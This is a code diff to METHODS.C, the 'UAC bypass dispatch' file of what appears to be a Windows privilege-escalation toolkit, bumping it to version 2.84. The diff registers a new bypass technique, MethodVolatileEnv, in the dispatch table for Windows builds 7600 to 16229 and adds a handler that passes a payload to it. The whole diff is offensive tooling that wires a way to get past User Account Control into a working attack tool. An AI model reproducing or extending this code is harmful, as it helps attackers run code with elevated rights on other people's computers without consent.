@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     2.83
+*  VERSION:     2.84
 *
-*  DATE:        13 Nov 2017
+*  DATE:        22 Nov 2017
 *
 *  UAC bypass dispatch.
 *
@@ -55,6 +55,7 @@ UCM_API(MethodCOMHandlers);
 UCM_API(MethodCMLuaUtil);
 UCM_API(MethodFwCplLua);
 UCM_API(MethodDccwCOM);
+UCM_API(MethodVolatileEnv);
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodTest, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
@@ -100,7 +101,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodCOMHandlers, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCMLuaUtil, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodFwCplLua, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodDccwCOM, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE }
+    { MethodDccwCOM, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodVolatileEnv, NULL, { 7600, 16229 }, FUBUKI_ID, FALSE, TRUE, TRUE }
 };
 
 /*
@@ -816,4 +818,12 @@ UCM_API(MethodDccwCOM)
         lpszPayload = g_ctx.szOptionalParameter;
 
     return ucmDccwCOMMethod(lpszPayload);
+}
+
+UCM_API(MethodVolatileEnv)
+{
+    UNREFERENCED_PARAMETER(Method);
+    UNREFERENCED_PARAMETER(ExtraContext);
+
+    return ucmMethodVolatileEnv(PayloadCode, PayloadSize);
 }
